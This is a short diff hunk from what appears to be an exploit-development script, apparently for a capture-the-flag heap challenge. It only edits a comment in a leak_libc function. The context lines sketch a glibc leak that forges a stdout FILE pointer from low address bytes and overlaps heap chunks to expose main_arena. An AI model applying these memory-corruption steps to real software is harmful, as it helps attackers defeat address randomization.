@@ -164,7 +164,7 @@ def leak_libc():
     # todo
     payload = '''offsets = pf.iofile.get_offsets(path_to_libc)
 fake_fd = p64(std_out_base + offsets['file']['_IO_write_ptr'])[:2]
-# base is 2 low bytes of stdout addr, exec p stdout to get it
+# base is 2 low bytes of stdout addr, exec "p stdout" in gdb to get it
 
 # first construct overlap chunk, to get main_arena's address as fd
 
